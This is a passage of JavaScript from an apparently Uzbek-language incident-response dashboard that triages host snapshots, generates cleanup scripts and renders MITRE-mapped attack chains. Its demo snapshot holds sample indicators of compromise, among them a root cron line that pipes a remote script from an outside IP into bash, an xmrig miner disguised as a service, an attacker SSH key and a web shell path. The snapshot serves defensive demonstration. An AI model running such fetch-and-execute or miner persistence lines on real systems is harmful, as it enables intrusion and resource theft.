    } else {
        const cur = document.getElementById('resp-cur')?.value || '';
        if (cur.startsWith('{')) args.current = cur;
        else args.current_path = cur;
    }
    
    const bas = document.getElementById('resp-base')?.value || '';
    if (bas) {
        if (bas.startsWith('{')) args.baseline = bas;
        else args.baseline_path = bas;
    }
    
    const protText = document.getElementById('resp-prot')?.value || '';
    let prot = [];
    if (protText) {
        protText.split('\n').forEach(l => {
            let m = l.trim().match(/^- (.+)$/);
            if (m) prot.push(m[1].split('#')[0].trim());
        });
    }
    args.protected = prot;
    
    const logsFile = document.getElementById('resp-logs-file')?.files?.[0];
    if (logsFile) {
        args.from_logs_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(logsFile); });
        args.from_logs_filename = logsFile.name;
    } else {
        const logsPath = document.getElementById('resp-logs')?.value || '';
        if (logsPath) args.from_logs_path = logsPath;
    }
    
    return args;
}

function renderSnapshotMissingWarning(targetOut) {
    targetOut.innerHTML = `
        <div class="card" style="border-color:var(--cyber-amber); background:var(--cyber-amber-bg); box-shadow:0 0 20px rgba(255,183,3,0.15);">
            <div style="display:flex; align-items:flex-start; gap:16px;">
                <span style="font-size:32px; line-height:1;">⚠️</span>
                <div style="flex:1;">
                    <h4 style="color:var(--cyber-amber); font-weight:800; font-size:15px; letter-spacing:0.5px;">Joriy Snapshot Kiritilmadi</h4>
                    <p style="font-size:12.5px; color:var(--text-secondary); margin-top:6px; line-height:1.6;">
                        Tahlil qilish yoki xavflarni aniqlash uchun nishon tizimdan olingan <code>snapshot.json</code> faylini yuklang yoki pastdagi demo tugmani bosing:
                    </p>
                    <div style="margin-top:12px;">
                        <button type="button" class="btn btn-demo btn-sm" onclick="loadDemoSnapshot()">⚡ Namuna Snapshotni Yuklash (Compromised Web Server)</button>
                    </div>
                </div>
            </div>
        </div>
    `;
}

async function respTriage() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Triage tahlili bajarilmoqda...</p></div>';
    const res = await api('/api/resp/triage', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red); border-color:var(--cyber-red-border);">${escapeHtml(res.error)}</div>`;
    
    let html = '<div class="card card-hud">';
    const findings = res.findings || res;
    const extra = res.extra || {};
    
    html += '<div class="card-title"><span>🛡 Aniqlangan Anomaliyalar &amp; Xavflar (Findings)</span><span class="brand-badge">' + findings.length + ' ta</span></div>';
    const rows = findings.map(f => [
        `<b>${f.score}</b>`,
        `<span class="badge badge-${f.confidence}">${f.confidence}</span>`,
        `<span class="badge badge-low">${escapeHtml(f.category)}</span>`,
        `<code class="code-cell">${escapeHtml(f.item)}</code>`,
        (f.techniques||[]).map(t => `<span class="tech-tag" onclick="showMitreModal('${t.id}')">${t.id}</span>`).join(' '),
        f.protected ? '<span class="badge badge-success">PROTECTED</span>' : '—',
        f.log_confirmed ? '<span class="log-tag">✔ LOG</span>' : '—',
        (f.reasons||[]).join(', ')
    ]);
    html += renderTable(["Ball (Score)", "Ishonch", "Kategoriya", "Ob'ekt (Item)", "Texnikalar", "Himoyalangan", "Log Tasdiqi", "Sabablar"], rows);
    
    if (extra.unmatched_log_artifacts && extra.unmatched_log_artifacts.length > 0) {
        html += `<div style="margin-top:20px; padding:14px; background:var(--cyber-red-bg); border:1px solid var(--cyber-red-border); border-radius:var(--radius-md);">
            <h4 style="color:var(--cyber-red); margin-bottom:8px;">⚠️ Loglarda bor, lekin Snapshotda topilmadi — QO'LDA TEKSHIRING:</h4>
            <ul style="margin-left:20px; font-size:12.5px; color:var(--text-primary);">`;
        extra.unmatched_log_artifacts.forEach(u => {
            html += `<li style="margin-bottom:4px;"><code>${escapeHtml(u.artifact)}</code> (Dalil: ${escapeHtml(u.evidence)})</li>`;
        });
        html += '</ul></div>';
    }
    html += '</div>';
    out.innerHTML = html;
}

async function respFix() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Remediation buyruqlari generatsiya qilinmoqda...</p></div>';
    args.os = document.getElementById('resp-os')?.value || 'windows';
    args.full = document.getElementById('resp-full')?.checked || false;
    const res = await api('/api/resp/fix', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red); border-color:var(--cyber-red-border);">${escapeHtml(res.error)}</div>`;
    
    out.innerHTML = `
        <div class="card card-hud">
            <div class="card-title">
                <span>🛡 Generatsiya qilingan Tozalash Skripti (${args.os.toUpperCase()})</span>
                <button class="btn btn-primary btn-sm" onclick="copyText(document.getElementById('fix-script-pre').innerText)">📋 Skriptdan Nusxa Olish</button>
            </div>
            <p style="font-size:12px; color:var(--text-secondary); margin-bottom:12px;">
                Eslatma: Nishon tizimda hech narsa avtomatik bajarilmaydi. Buyruqlarni tekshirib, qo'lda terminalda ishga tushiring.
            </p>
            <pre id="fix-script-pre" style="max-height:450px;">${escapeHtml(res.script)}</pre>
        </div>
    `;
}

async function respFraud() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Fraud &amp; RAT tekshiruvi bajarilmoqda...</p></div>';
    const res = await api('/api/resp/fraud', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red);">${escapeHtml(res.error)}</div>`;
    
    if (!Array.isArray(res) || res.length === 0) {
        out.innerHTML = `
            <div class="card" style="border-color:var(--cyber-mint-border); background:rgba(0,245,212,0.06);">
                <div class="card-title">
                    <span style="color:var(--cyber-mint);">🛡 Fraud &amp; RAT Tekshiruvi Natijasi</span>
                    <span class="brand-badge" style="border-color:var(--cyber-mint); color:var(--cyber-mint);">Toza (Clean)</span>
                </div>
                <p style="color:var(--text-primary); font-size:13px;">✅ Snapshotda masofaviy boshqaruv dasturlari (RAT), kriptominer yoki ruxsatsiz hosts o'zgarishlari aniqlanmadi.</p>
            </div>
        `;
        return;
    }
    
    let html = '<div class="card card-hud">';
    html += '<div class="card-title"><span>⚠️ Shubhali Fraud / RAT Ko\'rsatkichlari</span><span class="brand-badge" style="border-color:var(--cyber-red); color:var(--cyber-red);">' + res.length + ' ta</span></div>';
    const rows = res.map(item => [
        `<span class="tech-tag" onclick="showMitreModal('${item.technique}')">${escapeHtml(item.technique)}</span>`,
        `<span class="badge badge-high">SHUBHALI</span>`,
        escapeHtml(item.suggested_check || "Tekshirish tavsiya etiladi")
    ]);
    html += renderTable(["MITRE Texnika", "Xavf Darajasi", "Tavsiya etilgan Amaliyot"], rows);
    html += '</div>';
    out.innerHTML = html;
}

async function respDoctor() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    const svcName = document.getElementById('resp-doc-svc')?.value?.trim();
    if (!svcName) {
        out.innerHTML = `
            <div class="card" style="border-color:var(--cyber-amber); background:var(--cyber-amber-bg);">
                <span style="color:var(--cyber-amber); font-weight:700;">⚠️ Iltimos, to'xtagan servis nomini kiriting (masalan: nginx, apache2, sshd yoki mysql).</span>
            </div>
        `;
        return;
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Servis diagnostikasi o\'tkazilmoqda...</p></div>';
    args.service = svcName;
    const res = await api('/api/resp/doctor', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red);">${escapeHtml(res.error)}</div>`;
    
    let html = '<div class="card card-hud">';
    html += `<div class="card-title"><span>🩺 Servis Diagnostikasi: ${escapeHtml(svcName)}</span></div>`;
    if (!Array.isArray(res) || res.length === 0) {
        html += '<p style="color:var(--cyber-mint); font-size:13px;">✅ Ushbu servis konfiguratsiyasida bloklangan yoki xavfli holat aniqlanmadi.</p>';
    } else {
        const rows = res.map(d => [
            `<span class="badge badge-high">${escapeHtml(d.cause || "Noma'lum")}</span>`,
            escapeHtml(d.evidence || "—"),
            `<code class="code-cell">${escapeHtml(d.suggested_fix_command || "—")}</code>`,
            d.suggested_fix_command ? `<button class="action-btn" onclick="copyText('${escapeHtml(d.suggested_fix_command)}')">📋 Nusxa</button>` : '—'
        ]);
        html += renderTable(["Sabab (Cause)", "Dalil (Evidence)", "Tuzatish Buyrug'i", "Amal"], rows);
    }
    html += '</div>';
    out.innerHTML = html;
}

async function respSla() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>SLA holati tekshirilmoqda...</p></div>';
    args.services = [];
    const res = await api('/api/resp/sla', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red);">${escapeHtml(res.error)}</div>`;
    
    let html = '<div class="card card-hud">';
    html += '<div class="card-title"><span>⏱ SLA va Servislar Monitoringi</span></div>';
    if (!Array.isArray(res) || res.length === 0) {
        html += '<p style="color:var(--text-secondary); font-size:13px;">Snapshotda faol servislar ro\'yxati tahlil qilindi.</p>';
    } else {
        const rows = res.map(s => [
            `<b>${escapeHtml(s.name)}</b>`,
            s.ok ? '<span class="badge badge-success">OK (Online)</span>' : '<span class="badge badge-high">DOWN</span>',
            escapeHtml(s.detail || "Normal")
        ]);
        html += renderTable(["Servis Nomi", "Holat", "Tafsilot"], rows);
    }
    html += '</div>';
    out.innerHTML = html;
}

// ==================== Tracker Functions ====================
async function loadTracker() {
    const out = document.getElementById('trk-out');
    const res = await api('/api/tracker');
    if (res.error) return out.innerText = res.error;
    
    if (!res || !res.length) {
        out.innerHTML = '<div class="card" style="color:var(--text-dim); text-align:center; padding:30px;">Trackerda hali savollar yo\'q. Yuqoridagi forma orqali qo\'shing.</div>';
        return;
    }
    
    const rows = res.map(r => [
        `<b>${escapeHtml(r.question)}</b>`,
        `<span class="tech-tag" onclick="showMitreModal('${escapeHtml(r.candidates)}')">${escapeHtml(r.candidates)}</span>`,
        escapeHtml(r.evidence),
        `<span class="badge badge-success">${escapeHtml(r.status || 'faol')}</span>`,
        `<div style="display:flex; gap:6px;">
            <button class="action-btn btn-sm" onclick="copyText('${escapeHtml(r.candidates)}')">📋 Nusxa</button>
            <button class="action-btn btn-sm" style="border-color:var(--red-border); color:var(--red);" onclick="trkDel('${r.id}')">O'chirish</button>
        </div>`
    ]);
    out.innerHTML = '<div class="card">' + renderTable(['Savol', 'Nomzod ID / Javob', 'Dalil', 'Status', 'Amallar'], rows) + '</div>';
}

async function trkAdd() {
    const qField = document.getElementById('trk-q');
    const cField = document.getElementById('trk-c');
    const eField = document.getElementById('trk-e');
    const sField = document.getElementById('trk-s');
    
    const body = {
        question: qField.value,
        candidates: cField.value,
        evidence: eField.value,
        status: sField.value || 'tekshirilmoqda'
    };
    if (!body.question || !body.candidates) {
        alert("Savol va Nomzod javobni kiriting!");
        return;
    }
    await api('/api/tracker', 'POST', body);
    qField.value = ''; cField.value = ''; eField.value = ''; sField.value = '';
    showToast("✓ Trackerdagi savol saqlandi!");
    loadTracker();
}

async function trkDel(id) {
    await api(`/api/tracker/${id}`, 'DELETE');
    showToast("O'chirildi");
    loadTracker();
}

async function trkValidateAll() {
    const res = await api('/api/tracker');
    if (res.error) return;
    for (let row of res) {
        if (row.candidates) {
            const v = await api(`/api/validate?ids=${encodeURIComponent(row.candidates)}`);
            let new_c = [];
            let changed = false;
            if (!v.error) {
                for (let r of v) {
                    if (r.status === 'revoked' && r.replacement) {
                        new_c.push(r.replacement);
                        changed = true;
                    } else {
                        new_c.push(r.input);
                    }
                }
            }
            if (changed) {
                await api(`/api/tracker/${row.id}`, 'PUT', {candidates: new_c.join(',')});
            }
        }
    }
    showToast("✓ Barcha ID'lar tekshirildi va yangilandi!");
    loadTracker();
}

// ==================== Report Generator ====================
async function reportGenerate() {
    const data = {
        lang: document.getElementById('rep-lang').value,
        meta: {
            title: document.getElementById('rep-title').value,
            org: document.getElementById('rep-org').value,
            team: document.getElementById('rep-team').value,
            analyst: document.getElementById('rep-analyst').value,
            date: document.getElementById('rep-date').value,
            exec_summary: document.getElementById('rep-exec').value,
            recommendations: document.getElementById('rep-rec').value
        }
    };

    const logsFile = document.getElementById('rep-logs-file')?.files?.[0];
    if (logsFile) {
        data.logs_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(logsFile); });
        data.logs_filename = logsFile.name;
    } else {
        data.logs_path = document.getElementById('rep-logs')?.value || '';
    }

    const respFile = document.getElementById('rep-resp-file')?.files?.[0];
    if (respFile) {
        data.resp_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(respFile); });
        data.resp_filename = respFile.name;
    } else {
        data.resp_path = document.getElementById('rep-resp')?.value || '';
    }
    
    const outDiv = document.getElementById('rep-out');
    outDiv.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Hisobot generatsiya qilinmoqda...</p></div>';
    
    try {
        const res = await fetch('/api/report', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        const out = await res.json();
        if (out.error) {
            outDiv.innerHTML = `<div class="card" style="color:var(--red);">${escapeHtml(out.error)}</div>`;
            return;
        }
        outDiv.innerHTML = `
            <div class="card" style="border-color:var(--green-border); background:var(--green-bg); display:flex; justify-content:space-between; align-items:center;">
                <span>✅ <b>Hisobot yaratildi:</b> ${escapeHtml(out.path || "report.html")}</span>
                <a class="btn btn-primary btn-sm" href="data:text/html;charset=utf-8,${encodeURIComponent(out.html)}" download="incident_report.html">📥 HTML Yuklab Olish</a>
            </div>
        `;
        
        const iframe = document.getElementById('rep-preview');
        iframe.srcdoc = out.html;
        iframe.style.display = 'block';
    } catch (e) {
        outDiv.innerHTML = `<div class="card" style="color:var(--red);">${escapeHtml(String(e))}</div>`;
    }
}

// ==================== Demo & Cyber HUD Live Effects ====================

const DEMO_LINUX_SNAPSHOT = {
  "meta": {"os": "linux", "hostname": "web-prod-01", "collected_at": "2026-09-18T12:00:00", "collector_version": "1.0"},
  "users": [
    {"name": "root", "uid": 0, "is_admin": true, "shell": "/bin/bash"},
    {"name": "www-data", "uid": 33, "is_admin": false, "shell": "/usr/sbin/nologin"},
    {"name": "support", "uid": 0, "is_admin": true, "shell": "/bin/bash"}
  ],
  "services": [
    {"name": "nginx", "display": "nginx", "state": "Running", "start_mode": "enabled", "binary_path": "/usr/sbin/nginx", "run_as": "root"},
    {"name": "sysupdate", "display": "sysupdate", "state": "Running", "start_mode": "enabled", "binary_path": "/tmp/.x/xmrig", "run_as": "root"}
  ],
  "tasks": [],
  "cron": [
    {"user": "root", "line": "* * * * * curl -s http://185.220.101.44/x.sh | bash", "file": "/var/spool/cron/crontabs/root"}
  ],
  "autoruns": [
    {"location": "/etc/systemd/system/sysupdate.service", "name": "sysupdate", "value": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333"}
  ],
  "ssh_authorized_keys": [
    {"user": "root", "file": "/root/.ssh/authorized_keys", "key_fingerprint_or_line": "ssh-rsa AAAAB3NzaC1yc2attacker root@evil"}
  ],
  "suid_files": ["/usr/bin/passwd", "/usr/bin/sudo", "/tmp/rootbash"],
  "remote_access_tools": [],
  "hosts_file": [],
  "listening_ports": [
    {"proto": "tcp", "addr": "0.0.0.0", "port": 80, "pid": 700, "process": "nginx"},
    {"proto": "tcp", "addr": "0.0.0.0", "port": 22, "pid": 640, "process": "sshd"}
  ],
  "connections": [
    {"proto": "tcp", "laddr": "10.0.1.15", "lport": 51020, "raddr": "203.0.113.88", "rport": 4444, "pid": 1400, "process": "bash"},
    {"proto": "tcp", "laddr": "10.0.1.15", "lport": 51044, "raddr": "185.220.101.44", "rport": 3333, "pid": 1502, "process": "xmrig"}
  ],
  "recent_modified": [
    {"path": "/var/www/html/uploads/shell.php", "mtime": "2026-09-18T10:01:40"},
    {"path": "/tmp/.x/xmrig", "mtime": "2026-09-18T10:11:30"},
    {"path": "/tmp/rootbash", "mtime": "2026-09-18T10:06:24"}
  ],
  "errors": []
};

function loadDemoSnapshot() {
    const curIn = document.getElementById('resp-cur');
    const osSelect = document.getElementById('resp-os');
    if (curIn) {
        curIn.value = JSON.stringify(DEMO_LINUX_SNAPSHOT);
    }
    if (osSelect) {
        osSelect.value = 'linux';
    }
    const snapFile = document.getElementById('resp-snap-file');
    if (snapFile) snapFile.value = '';
    showToast('⚡ Namuna snapshot yuklandi (Linux)!');
    respTriage();
}

function loadDemoLog() {
    const input = document.getElementById('log-path');
    if (input) {
        input.value = 'elasticsearch_export.json';
        const fileIn = document.getElementById('log-file');
        if (fileIn) fileIn.value = '';
        showToast('⚡ Namuna log yo\'li tanlandi!');
        logAnalyze();
    }
}

function initClock() {
    const el = document.getElementById('soc-clock');
    if (!el) return;
    function update() {
        const now = new Date();
        const hours = String(now.getHours()).padStart(2, '0');
        const mins = String(now.getMinutes()).padStart(2, '0');
        const secs = String(now.getSeconds()).padStart(2, '0');
        el.innerText = `${hours}:${mins}:${secs}`;
    }
    update();
    setInterval(update, 1000);
}

function initCyberCanvas() {
    const canvas = document.getElementById('cyber-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
    });

    const particles = [];
    const count = Math.min(48, Math.max(24, Math.floor((width * height) / 32000)));
    for (let i = 0; i < count; i++) {
        particles.push({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.45,
            vy: (Math.random() - 0.5) * 0.45,
            radius: Math.random() * 2.2 + 1,
            isHex: Math.random() > 0.65,
            glow: Math.random() > 0.5
        });
    }

    let mouse = { x: -1000, y: -1000 };
    window.addEventListener('mousemove', (e) => {
        mouse.x = e.clientX;
        mouse.y = e.clientY;
    });

    function drawHexagon(x, y, r) {
        ctx.beginPath();
        for (let i = 0; i < 6; i++) {
            const angle = (Math.PI / 3) * i;
            const hx = x + r * Math.cos(angle);
            const hy = y + r * Math.sin(angle);
            if (i === 0) ctx.moveTo(hx, hy);
            else ctx.lineTo(hx, hy);
        }
        ctx.closePath();
    }

    function animate() {
        ctx.clearRect(0, 0, width, height);

        for (let i = 0; i < particles.length; i++) {
            const p = particles[i];
            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0) p.x = width;
            else if (p.x > width) p.x = 0;
            if (p.y < 0) p.y = height;
            else if (p.y > height) p.y = 0;

            for (let j = i + 1; j < particles.length; j++) {
                const p2 = particles[j];
                const dx = p.x - p2.x;
                const dy = p.y - p2.y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < 135) {
                    const alpha = (1 - dist / 135) * 0.22;
                    ctx.strokeStyle = `rgba(0, 212, 255, ${alpha})`;
                    ctx.lineWidth = 1;
                    ctx.beginPath();
                    ctx.moveTo(p.x, p.y);
                    ctx.lineTo(p2.x, p2.y);
                    ctx.stroke();
                }
            }

            const mdx = p.x - mouse.x;
            const mdy = p.y - mouse.y;
            const mdist = Math.sqrt(mdx * mdx + mdy * mdy);
            if (mdist < 150) {
                const malpha = (1 - mdist / 150) * 0.4;
                ctx.strokeStyle = `rgba(0, 245, 212, ${malpha})`;
                ctx.lineWidth = 1.2;
                ctx.beginPath();
                ctx.moveTo(p.x, p.y);
                ctx.lineTo(mouse.x, mouse.y);
                ctx.stroke();
            }

            if (p.isHex) {
                drawHexagon(p.x, p.y, p.radius * 2.2);
                ctx.strokeStyle = p.glow ? 'rgba(0, 240, 255, 0.7)' : 'rgba(0, 119, 255, 0.4)';
                ctx.lineWidth = 1.2;
                ctx.stroke();
            } else {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                ctx.fillStyle = p.glow ? 'rgba(0, 245, 212, 0.8)' : 'rgba(0, 212, 255, 0.4)';
                ctx.fill();
            }
        }

        requestAnimationFrame(animate);
    }

    animate();
}

// ==================== INCIDENT RESPONSE ENGINE ====================

let lastIRResult = null;

function loadDemoIRLog() {
    const p = document.getElementById('ir-log-path');
    if (p) p.value = 'elasticsearch_export.json';
    const f = document.getElementById('ir-log-file');
    if (f) f.value = '';
    showToast("⚡ Namuna log yo'li tanlandi!");
    runIRChainAnalysis();
}

function downloadBlob(content, filename, mimeType) {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`💾 Yuklab olindi: ${filename}`);
}

function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => showToast("📋 Buferga nusxa olindi!"));
    } else {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        showToast("📋 Buferga nusxa olindi!");
    }
}

async function runIRChainAnalysis() {
    const pathInput = document.getElementById('ir-log-path');
    const fileInput = document.getElementById('ir-log-file');
    const langSelect = document.getElementById('ir-lang');
    const out = document.getElementById('ir-out');
    const btn = document.getElementById('btn-ir-analyze');

    const path = pathInput ? pathInput.value.trim() : '';
    const files = fileInput && fileInput.files ? fileInput.files : [];
    const lang = langSelect ? langSelect.value : 'ru';

    if (!path && files.length === 0) {
        showToast("⚠️ Iltimos, log fayl yo'lini kiriting yoki fayl tanlang!", "error");
        return;
    }

    if (btn) {
        btn.disabled = true;
        btn.innerHTML = `<span>⏳ Zanjir tiklanmoqda...</span>`;
    }

    if (out) {
        out.innerHTML = `
            <div class="card card-hud" style="text-align: center; padding: 40px; margin-top: 24px;">
                <div class="spinner" style="margin: 0 auto 16px auto;"></div>
                <div style="font-size: 17px; font-weight: 600; color: var(--neon-cyan);">Loglar tahlil qilinmoqda...</div>
                <div class="helper-text" style="margin-top: 8px;">Standart tizim jarayonlari saralanib, haqiqiy kiberhujum zanjiri ajratilmoqda.</div>
            </div>
        `;
    }

    try {
        let payload = { lang: lang };
        if (files.length > 0) {
            payload.files = [];
            for (let f of files) {
                const content = await f.text();
                payload.files.push({ filename: f.name, content: content });
            }
        } else if (path.includes(',')) {
            payload.files = path.split(',').map(p => ({ path: p.trim() }));
        } else {
            payload.path = path;
        }

        const res = await fetch('/api/ir/chain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!res.ok) {
            const errData = await res.json().catch(() => ({}));
            throw new Error(errData.error || `Server xatosi: ${res.status}`);
        }

        const data = await res.json();
        lastIRResult = data;
        renderIRResults(data);
        showToast("⚡ Hujum zanjiri va MITRE korrelyatsiyasi muvaffaqiyatli tiklandi!");
    } catch (err) {
        console.error(err);
        showToast(`❌ Xatolik: ${err.message}`, "error");
        if (out) {
            out.innerHTML = `
                <div class="card card-hud" style="border-color: var(--crimson); margin-top: 24px;">
                    <div class="card-title" style="color: var(--crimson);">❌ Xatolik yuz berdi</div>
                    <p class="helper-text" style="color: var(--crimson);">${escapeHtml(err.message)}</p>
                </div>
            `;
        }
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = `<span>🚀 Zanjirni Tiklash</span>`;
        }
    }
}

function renderIRResults(data) {
    const out = document.getElementById('ir-out');
    if (!out) return;

    const model = data.model || {};
    const chain = model.chain || {};
    const stages = chain.stages || [];
    const iocs = model.all_iocs || [];
    const mitre = model.mitre_summary || [];

    const severityColor = model.severity === 'CRITICAL' ? 'var(--crimson)' : 'var(--amber)';

    let stagesHtml = '';
    stages.forEach((s, idx) => {
        const ts = (s.timestamp || '').substring(0, 19).replace('T', ' ');
        stagesHtml += `
            <tr>
                <td style="font-weight: 700; color: var(--neon-cyan); text-align: center;">${idx + 1}</td>
                <td style="font-family: var(--font-mono); font-size: 13.5px; white-space: nowrap;">${escapeHtml(ts)}</td>
                <td><span class="badge" style="background: rgba(6, 182, 212, 0.15); color: var(--neon-cyan); border: 1px solid rgba(6, 182, 212, 0.3); font-weight: 600;">${escapeHtml(s.host || 'N/A')}</span></td>
                <td><span class="badge" style="background: rgba(245, 158, 11, 0.15); color: var(--amber); border: 1px solid rgba(245, 158, 11, 0.3); white-space: normal; text-align: center; line-height: 1.3;">${escapeHtml(s.phase || '')}</span></td>
                <td>
                    <span class="badge" style="background: rgba(16, 185, 129, 0.15); color: var(--cyber-mint); border: 1px solid rgba(16, 185, 129, 0.3); font-weight: 700;">${escapeHtml(s.technique_id)}</span>
                    <span style="font-size: 13.5px; margin-left: 6px;">${escapeHtml(s.technique_name)}</span>
                </td>
                <td style="font-family: var(--font-mono); font-size: 12.5px; line-height: 1.45; min-width: 260px; overflow-wrap: anywhere; color: var(--text-muted);">${escapeHtml(s.evidence || '')}</td>
                <td style="font-size: 13px; line-height: 1.5; min-width: 300px; color: var(--text-main);">${escapeHtml(s.explain_uz || '')}</td>
            </tr>
        `;
    });

    let iocsHtml = '';
    iocs.forEach(i => {
        iocsHtml += `
            <tr>
                <td style="font-family: var(--font-mono); font-weight: 700; color: var(--cyber-mint);">${escapeHtml(i.value)}</td>
                <td><span class="badge" style="background: rgba(255,255,255,0.06); color: var(--text-muted);">${escapeHtml(i.type)}</span></td>
                <td><span class="badge" style="background: rgba(239, 68, 68, 0.15); color: var(--crimson);">${escapeHtml(i.role)}</span></td>
                <td style="font-size: 13.5px; color: var(--text-muted);">${escapeHtml(i.description)}</td>
            </tr>
        `;
    });

    let mitreHtml = '';
    mitre.forEach(m => {
        mitreHtml += `
            <tr>
                <td><b style="color: var(--cyber-mint); font-family: var(--font-mono);">${escapeHtml(m.technique_id)}</b></td>
                <td style="font-weight: 600;">${escapeHtml(m.technique_name)}</td>
                <td><span class="badge" style="background: rgba(6, 182, 212, 0.15); color: var(--neon-cyan);">${escapeHtml(m.phase)}</span></td>
                <td><span class="brand-badge" style="color: var(--cyber-mint); border-color: var(--cyber-mint);">🟢 TASDIQLANGAN</span></td>
                <td style="text-align: center; font-weight: 700;">${m.occurrences || 1}</td>
                <td style="font-family: var(--font-mono); font-size: 13px; color: var(--text-muted); max-width: 380px; word-break: break-all;">${escapeHtml(m.sample_evidence || '')}</td>
            </tr>
        `;
    });

    out.innerHTML = `
        <div class="card card-hud" style="margin-top: 24px; border-left: 5px solid ${severityColor};">
            <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 16px;">
                <div>
                    <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 8px;">
                        <span class="brand-badge" style="background: rgba(239,68,68,0.2); color: ${severityColor}; border-color: ${severityColor}; font-weight: 800; font-size: 13px;">${model.severity} SEVERITY</span>
                        <span class="brand-badge" style="color: var(--cyber-mint); border-color: var(--cyber-mint);">ISHONCHLILIK: ${model.confidence_pct}%</span>
                        <span style="color: var(--text-dim); font-family: var(--font-mono); font-size: 13px;">${escapeHtml(model.case_id || '')}</span>
                    </div>
                    <h3 style="font-size: 20px; font-weight: 700; color: #fff; margin: 0 0 8px 0;">${escapeHtml(model.title || '')}</h3>
                    <div style="display: flex; gap: 20px; flex-wrap: wrap; font-size: 14px; color: var(--text-muted);">
                        <div>🏢 <b>Hostlar:</b> ${(model.hosts || []).map(h => `<code style="color:var(--neon-cyan);">${escapeHtml(h)}</code>`).join(', ')}</div>
                        <div>👤 <b>Accountlar:</b> ${(model.accounts || []).map(a => `<code style="color:var(--amber);">${escapeHtml(a)}</code>`).join(', ')}</div>
                        <div>⏱ <b>Vaqt:</b> ${(model.period_start || '').substring(0,19).replace('T',' ')} – ${(model.period_end || '').substring(0,19).replace('T',' ')} UTC</div>
                        <div>📊 <b>Tahlil:</b> ${model.total_events_processed || 0} log, <b>${stages.length} ta zanjir qadami</b></div>
                    </div>
                </div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <button class="btn btn-primary" onclick="downloadBlob(JSON.stringify(lastIRResult.scoring_json, null, 2), 'submission.json', 'application/json')" style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(6, 182, 212, 0.3)); border-color: var(--cyber-mint); font-weight: 600;">
                        📥 submission.json (Ball / Hakamlar)
                    </button>
                    <button class="btn btn-secondary" onclick="downloadBlob(lastIRResult.report_md, 'incident_report.md', 'text/markdown')">
                        📑 incident_report.md
                    </button>
                    <button class="btn btn-secondary" onclick="copyToClipboard(lastIRResult.report_md)">
                        📋 Hisobotdan Nusxa Olish
                    </button>
                </div>
            </div>
        </div>

        <h3 class="section-title" style="margin-top: 30px; font-size: 20px;">⛓ To'liq Kiberhujum Zanjiri (Attack Chain Timeline)</h3>
        <div class="card card-hud" style="padding: 0; overflow-x: auto;">
            <table class="data-table" style="margin: 0; width: 100%;">
                <thead>
                    <tr>
                        <th style="width: 44px;">#</th>
                        <th style="width: 150px;">Vaqt (UTC)</th>
                        <th style="width: 112px;">Host</th>
                        <th style="width: 150px;">Hujum Fazasi</th>
                        <th style="width: 210px;">MITRE ATT&amp;CK</th>
                        <th style="min-width: 260px;">Aniq Dalil (Evidence / Payload)</th>
                        <th style="min-width: 300px;">Izoh (nima sodir bo'ldi)</th>
                    </tr>
                </thead>
                <tbody>
                    ${stagesHtml}
                </tbody>
            </table>
        </div>

        <div class="grid-2" style="margin-top: 24px;">
            <div class="card card-hud" style="padding: 0; overflow-x: auto;">
